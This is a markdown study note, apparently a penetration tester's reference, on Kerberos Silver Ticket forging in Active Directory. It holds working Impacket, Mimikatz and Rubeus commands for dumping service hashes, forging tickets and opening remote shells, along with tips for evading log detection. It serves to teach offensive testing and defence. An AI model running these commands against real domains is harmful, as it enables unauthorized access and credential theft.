# 📌 Silver Ticket Attacks

> Forge a service ticket directly using a service account's hash — bypass the KDC entirely, impersonate any user to a specific service, and leave almost no trace.

---

## 🔍 Definition

A Silver Ticket is a **forged TGS (service ticket)** created by an attacker who has obtained the NTLM hash (or AES key) of a service account. Unlike a Golden Ticket (which requires the `krbtgt` hash and grants domain-wide access), a Silver Ticket targets a **single service** on a **single host** — but it never touches the KDC, making it significantly stealthier. The ticket is presented directly to the service, which validates it using its own hash without contacting the DC. MITRE T1558.002.

---

## 🧠 Core Concepts

- **TGS (Service Ticket)** — normally issued by the KDC, encrypted with the service account's hash. Silver Ticket skips the KDC and forges this directly
- **PAC (Privilege Attribute Certificate)** — embedded in Kerberos tickets, contains group memberships + user SID. You control what goes in the PAC when forging — you can claim any group membership, including Domain Admins
- **No DC contact** — the forged ticket goes straight to the service. The DC never sees it. No Event ID 4769 on the DC
- **Domain SID** — required to forge the ticket. The Security Identifier of the domain (`S-1-5-21-...`). Get it from any domain enumeration
- **User ID** — the RID of the user you're impersonating. Administrator = 500. Can be any valid or even non-existent user ID
- **SPN specificity** — the ticket is valid only for the specific SPN you target (`cifs/host`, `http/host`, `mssql/host`, etc.)
- **AES vs RC4** — if the target service is AES-only (Windows Server 2025, hardened configs), RC4-based Silver Tickets fail. Use AES keys obtained via DCSync or LSASS dump
- **PAC validation** — optional server-side check where the service contacts the DC to verify the PAC. Almost never enabled in practice. If enabled, Silver Tickets fail
- **Hash sources** — Kerberoasting, secretsdump, LSASS dump, DCSync — any method that yields the service account's hash

---

## ⚙️ How It Works

**Normal TGS flow:**
1. Client presents TGT to KDC → KDC issues TGS encrypted with service account hash
2. Client presents TGS to service → service decrypts and grants access

**Silver Ticket flow:**
1. Attacker has service account hash (via Kerberoast, dump, etc.)
2. Attacker **forges a TGS** encrypted with that hash → claims to be Administrator (or any user), with whatever PAC they want
3. Attacker presents forged TGS directly to the service
4. Service decrypts with its own hash → sees valid ticket → grants access as "Administrator"
5. DC never involved. No 4769 event.

> 💡 The key insight: the service trusts anyone who can produce a ticket encrypted with its hash. If you have the hash, you control the ticket — including who it claims you are.

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| Golden Ticket | Forged TGT using `krbtgt` hash → domain-wide access, goes through KDC |
| Silver Ticket | Forged TGS using service account hash → single service, bypasses KDC |
| Diamond Ticket | Modified real TGT with copied PAC — stealthier than Golden |
| Sapphire Ticket | PAC copied from real user using S4U2Self+U2U — most stealthy |
| ticketer.py | Impacket script for forging Silver and Golden tickets |
| Mimikatz kerberos::golden | Used for both Golden AND Silver tickets (different flags) |
| ccache | Linux/Impacket ticket format (`Administrator.ccache`) |
| kirbi | Windows/Mimikatz ticket format (`ticket.kirbi`) |
| PAC Validation | Optional DC call from service to verify PAC integrity. Blocks Silver Tickets if enabled |
| RID 500 | Default Administrator account RID — use as `/user-id` for max privilege |

---

## 🔥 Important Details & Gotchas

- **No 4769 on DC** — the only reliable detection is on the service itself (4624 logon event with unusual pattern) or anomaly-based detection. Traditional DC log monitoring misses Silver Tickets
- **Ticket lifetime trap** — tools default to 10-year validity. This is a red flag in logs. Set realistic durations (`-duration 480` = 8 hours) to blend in
- **AES-only environments** — Windows Server 2022/2025 with hardened Kerberos may reject RC4 tickets. Impacket's ticketer.py supports `-aesKey` for AES256 forging
- **gMSA and machine account hashes** — machine accounts rotate every 30 days. If you get a machine account hash via relay or coercion, forge tickets before it rotates. gMSA passwords rotate automatically
- **Service class substitution** — if you have a hash for a service, the SPN service class part matters. If the account has SPN `cifs/target` and you want LDAP, you need to forge with `ldap/target` (same host, different class). These usually share the same underlying account hash
- **Always use FQDN, not IP** — Kerberos auth fails with IP addresses. The service validates based on hostname. Common mistake
- **Silver Ticket → SYSTEM via Potato** — if you Silver Ticket into a MSSQL service account and it has `SeImpersonatePrivilege` (common), you can escalate to SYSTEM via PrintSpoofer/GodPotato immediately

---

## 🌍 Real-World Usage / Examples

**Get required info:**
```bash
# Domain SID
impacket-getPac -targetUser Administrator corp.local/user:pass
# Or from secretsdump output
# Or: nxc smb <DC-IP> -u user -p pass

# Service account NTLM hash (from Kerberoasting or secretsdump)
impacket-GetUserSPNs corp.local/user:pass -dc-ip <DC-IP> -request
# → crack the hash to get plaintext → convert to NT hash
# Or: secretsdump gave you the hash directly

# Get domain SID via PowerView:
Get-DomainSID
# Or: lookupsid tool from Impacket
impacket-lookupsid corp.local/user:pass@<DC-IP>
```

**Forge Silver Ticket (Impacket ticketer.py):**
```bash
# CIFS (file share) → shell via smbexec
impacket-ticketer -nthash <service_ntlm_hash> \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain corp.local \
  -spn cifs/target.corp.local \
  Administrator

export KRB5CCNAME=Administrator.ccache
impacket-smbexec -k -no-pass corp.local/Administrator@target.corp.local

# MSSQL → database access
impacket-ticketer -nthash <sqlsvc_hash> \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain corp.local \
  -spn MSSQLSvc/db.corp.local:1433 \
  -user-id 500 \
  Administrator

export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass corp.local/Administrator@db.corp.local

# HTTP (IIS / web service)
impacket-ticketer -nthash <iis_hash> \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain corp.local \
  -spn http/webserver.corp.local \
  Administrator

# AES256 variant (for hardened environments)
impacket-ticketer -aesKey <AES256_hex_key> \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain corp.local \
  -spn cifs/target.corp.local \
  -duration 480 \
  Administrator
```

**Forge Silver Ticket (Mimikatz — Windows):**
```cmd
# Dump service hash first
sekurlsa::logonpasswords
lsadump::lsa /patch

# Forge (uses same kerberos::golden command, different params)
kerberos::golden /domain:corp.local \
  /sid:S-1-5-21-XXXX-XXXX-XXXX \
  /target:target.corp.local \
  /service:cifs \
  /rc4:<service_ntlm_hash> \
  /user:Administrator \
  /id:500 \
  /ptt

# Verify ticket in memory
klist
```

**Rubeus:**
```cmd
.\Rubeus.exe asktgs /user:Administrator \
  /rc4:<service_hash> \
  /domain:corp.local \
  /service:cifs/target.corp.local \
  /ptt /nowrap
```

**Use the ticket:**
```bash
# Shell
impacket-smbexec -k -no-pass corp.local/Administrator@target.corp.local
impacket-wmiexec -k -no-pass corp.local/Administrator@target.corp.local

# Dump secrets from the target (not the DC)
impacket-secretsdump -k -no-pass corp.local/Administrator@target.corp.local

# RDP (CIFS + host ticket for the computer object)
xfreerdp /u:Administrator /d:corp.local /v:target.corp.local /pth:<hash>
```

**Common target SPNs:**
```
cifs/<host.domain>           → File shares, SMB (smbexec, psexec)
http/<host.domain>           → IIS, web services
mssql/<host.domain>:1433     → SQL Server
host/<host.domain>           → Broad host access (winrm, tasks, etc.)
ldap/<dc.domain>             → LDAP on DC → DCSync if DA hash used
wsman/<host.domain>          → WinRM
```

---

## 🔗 Related Topics

- [[Kerberos Authentication]]
- [[Kerberoasting Deep Dive]]
- [[Active Directory (AD)]]
- [[NTLM and Pass-the-Hash]]
- [[Delegation Attacks (Constrained, Unconstrained)]]
- [[Privilege Escalation - Windows]]
- [[Golden Ticket & krbtgt Abuse]]

---

## 📚 Sources / Further Reading

- [HackTricks — Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket) — full Impacket + Rubeus + Mimikatz reference with AES support
- [CrowdStrike — Silver Ticket Attack (Aug 2025)](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/silver-ticket-attack/) — current detection guidance
- [Netwrix — Silver Ticket](https://www.netwrix.com/silver_ticket_attack_forged_service_tickets.html) — PAC validation explained
- [hackndo — Silver & Golden Tickets](https://en.hackndo.com/kerberos-silver-golden-tickets/) — PAC internals + AES ticket forging
- [Secured — Silver Ticket Attack](https://secured.ai/active-directory-series-silver-ticket-attack/) — full MSSQL Silver Ticket walkthrough
- [Rapid7 — forge_ticket module](https://rapid7.github.io/metasploit-framework/docs/pentesting/active-directory/kerberos/forge_ticket.html) — Diamond/Sapphire ticket coverage
- HTB Machine: `Scrambled` (Silver Ticket via MSSQL)
- MITRE ATT&CK: T1558.002
